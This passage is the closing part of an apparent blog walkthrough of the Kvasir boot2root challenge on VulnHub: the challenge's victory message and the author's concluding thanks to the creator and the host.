  "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 

Congratulations on beating Kvasir - I hope you enjoyed
the ride.  Take his blood, mix with honey and drink 
the Mead of Poetry...

Big shout out to my beta testers: @barrebas and @TheColonial.
Special thanks to Bas for his patience during this endeavour.

Feel free to ping me with thoughts/comments on
http://wi-fu.co.uk, #VulnHub IRC or Twitter.

  rasta_mouse(@_RastaMouse)

>>>
```

##conclusion
Wow. I actually can't describe how tired I am now haha. From both doing Kvasir and taking almost a full day for this writeup :D However, this is most definitely one of my most favorite boot2roots out there thus far!

Many many thanks to [@_RastaMouse](https://twitter.com/_RastaMouse) for putting together this polished piece of work and [@VulnHub](https://twitter.com/VulHub) for the hosting!
